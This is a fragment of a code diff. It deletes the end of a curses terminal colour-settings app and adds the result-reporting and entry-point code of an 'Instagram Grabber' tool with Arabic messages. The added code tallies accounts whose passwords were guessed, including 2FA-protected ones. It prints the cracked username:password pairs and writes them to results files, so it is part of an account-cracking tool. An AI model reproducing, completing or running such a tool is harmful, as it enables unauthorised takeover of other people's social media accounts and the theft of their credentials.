-                    curses.color_pair(pair)
-                )
-
-        center_text(
-            stdscr,
-            max(14, height - 4),
-            "W/S = UP/DOWN    A/D = LEFT/RIGHT",
-            curses.color_pair(2)
-        )
-
-        center_text(
-            stdscr,
-            max(15, height - 3),
-            "F = FOREGROUND    B = BACKGROUND",
-            curses.color_pair(2)
-        )
-
-        center_text(
-            stdscr,
-            max(16, height - 2),
-            "T = THEMES    S = SAVE    Q = EXIT",
-            curses.color_pair(2)
-        )
-
-        if message:
-
-            center_text(
-                stdscr,
-                height - 1,
-                message,
-                curses.color_pair(2) | curses.A_BOLD
-            )
-
-        stdscr.refresh()
-
-        key = stdscr.getch()
-
-        message = ""
-
-        # ====================================================
-        # NAVIGATION
-        # ====================================================
-
-        # W = UP
-        if key in (ord("w"), ord("W")):
-
-            if selected >= 10:
-                selected -= 10
-
-        # S = DOWN
-        elif key in (ord("s"), ord("S")):
-
-            if selected < 40:
-                selected += 10
-
-        # A = LEFT
-        elif key in (ord("a"), ord("A")):
-
-            if selected % 10 != 0:
-                selected -= 1
-
-        # D = RIGHT
-        elif key in (ord("d"), ord("D")):
-
-            if selected % 10 != 9:
-                selected += 1
-
-        # ====================================================
-        # FOREGROUND
-        # ====================================================
-
-        elif key in (ord("f"), ord("F")):
-
-            current = config["fg"][selected]
-
-            try:
-                index = COLOR_NAMES.index(current)
-            except ValueError:
-                index = 0
-
-            index = (index + 1) % len(COLOR_NAMES)
-
-            config["fg"][selected] = COLOR_NAMES[index]
-
-            save_config(config)
-
-            message = (
-                f"BUTTON {selected + 1}: "
-                f"FG = {COLOR_NAMES[index]}"
-            )
-
-        # ====================================================
-        # BACKGROUND
-        # ====================================================
-
-        elif key in (ord("b"), ord("B")):
-
-            current = config["bg"][selected]
-
-            try:
-                index = COLOR_NAMES.index(current)
-            except ValueError:
-                index = 0
-
-            index = (index + 1) % len(COLOR_NAMES)
-
-            config["bg"][selected] = COLOR_NAMES[index]
-
-            save_config(config)
-
-            message = (
-                f"BUTTON {selected + 1}: "
-                f"BG = {COLOR_NAMES[index]}"
-            )
-
-        # ====================================================
-        # THEMES
-        # ====================================================
-
-        elif key in (ord("t"), ord("T")):
-
-            theme_menu(
-                stdscr,
-                config
-            )
-
-        # ====================================================
-        # SAVE
-        # ====================================================
-
-        elif key in (ord("s"), ord("S")):
-
-            save_config(config)
-
-            message = "SAVED SUCCESSFULLY"
-
-        # ====================================================
-        # EXIT
-        # ====================================================
-
-        elif key in (ord("q"), ord("Q")):
-
-            save_config(config)
-
-            return
-
-
-# ============================================================
-# MAIN
-# ============================================================
-
-def main(stdscr):
-
+                failed_count += 1
+                cprint(f"[{processed}/{self.num_accounts}] ", Colors.WHITE, end='')
+                cprint("❌ فشل ", Colors.YELLOW, end='')
+                cprint(f"{result['username']}", Colors.DIM)
+            
+            # إحصائيات مباشرة
+            cprint(f"    📊 نجح: {found_count} | 2FA: {twofa_count} | فشل: {failed_count} | غير موجود: {not_found_count} | محاولات: {self.total_attempts}", 
+                  Colors.BLUE, bold=True)
+            print()
+        
+        # عرض النتائج النهائية
+        self._display_final_results(found_count, twofa_count, failed_count, not_found_count)
+        self._save_results()
+    
+    def _display_final_results(self, found, twofa, failed, not_found):
+        cprint("=" * 70, Colors.MAGENTA, bold=True)
+        cprint("  النتائج النهائية", Colors.MAGENTA, bold=True)
+        cprint("=" * 70, Colors.MAGENTA, bold=True)
+        print()
+        
+        cprint(f"✅ الحسابات الناجحة: {found}", Colors.GREEN, bold=True)
+        cprint(f"🔒 حسابات 2FA (كلمة صحيحة): {twofa}", Colors.CYAN, bold=True)
+        cprint(f"❌ الحسابات الفاشلة: {failed}", Colors.YELLOW)
+        cprint(f"🚫 الحسابات غير الموجودة: {not_found}", Colors.RED)
+        cprint(f"📊 إجمالي المحاولات: {self.total_attempts}", Colors.WHITE, bold=True)
+        print()
+        
+        if self.found_accounts:
+            cprint("=" * 70, Colors.GREEN, bold=True)
+            cprint("  الحسابات الناجحة (Username : Password)", Colors.GREEN, bold=True)
+            cprint("=" * 70, Colors.GREEN, bold=True)
+            for acc in self.found_accounts:
+                cprint(f"  {acc['username']}", Colors.WHITE, bold=True, end='')
+                cprint(" : ", Colors.YELLOW, end='')
+                cprint(f"{acc['password']}", Colors.GREEN, bold=True)
+            print()
+        
+        if self.twofa_accounts:
+            cprint("=" * 70, Colors.CYAN, bold=True)
+            cprint("  حسابات 2FA (Username : Password)", Colors.CYAN, bold=True)
+            cprint("=" * 70, Colors.CYAN, bold=True)
+            for acc in self.twofa_accounts:
+                cprint(f"  {acc['username']}", Colors.WHITE, bold=True, end='')
+                cprint(" : ", Colors.YELLOW, end='')
+                cprint(f"{acc['password']}", Colors.CYAN, bold=True)
+            print()
+    
+    def _save_results(self):
+        # حفظ النتائج
+        all_found = self.found_accounts + self.twofa_accounts
+        
+        if all_found:
+            with open('terminal_results.txt', 'w') as f:
+                for acc in all_found:
+                    f.write(f"{acc['username']}:{acc['password']}\n")
+            
+            with open('terminal_results.json', 'w') as f:
+                json.dump({
+                    'found': self.found_accounts,
+                    'twofa': self.twofa_accounts,
+                    'total_attempts': self.total_attempts
+                }, f, indent=2)
+            
+            cprint("[*] تم حفظ النتائج في: terminal_results.txt, terminal_results.json", 
+                  Colors.BLUE, bold=True)
+
+# ==================== نقطة الدخول ====================
+def main():
+    import argparse
+    
+    parser = argparse.ArgumentParser(description='Ghost Terminal Instagram Grabber')
+    parser.add_argument('--count', type=int, default=100, help='عدد الحسابات (الافتراضي: 100)')
+    
+    args = parser.parse_args()
+    
+    grabber = TerminalInstaGrabber(num_accounts=args.count)
+    
     try:
-        curses.curs_set(0)
-    except Exception:
-        pass
-
-    try:
-        curses.start_color()
-    except Exception:
-        pass
-
-    try:
-        curses.use_default_colors()
-    except Exception:
-        pass
-
-    if not curses.has_colors():
-
-        stdscr.clear()
-
-        safe_addstr(
-            stdscr,
-            1,
-            1,
-            "Your terminal does not support colors."
-        )
-
-        safe_addstr(
-            stdscr,
-            2,
-            1,
-            "Press any key to exit."
-        )
-
-        stdscr.refresh()
-        stdscr.getch()
-
-        return
-
-    config = load_config()
-
-    login_screen(
-        stdscr,
-        config
-    )
-
-
-# ============================================================
-# START
-# ============================================================
+        asyncio.run(grabber.run())
+    except KeyboardInterrupt:
+        cprint("\n\n[!] تم إيقاف الأداة بواسطة المستخدم", Colors.RED, bold=True)
+        grabber._save_results()
 
 if __name__ == "__main__":
-
-    try:
-
-        curses.wrapper(main)
-
-    except KeyboardInterrupt:
-
-        pass
-
-    except Exception as error:
-
-        print()
-        print("Bounty Scout stopped.")
-        print("Error:", error)
+    main()
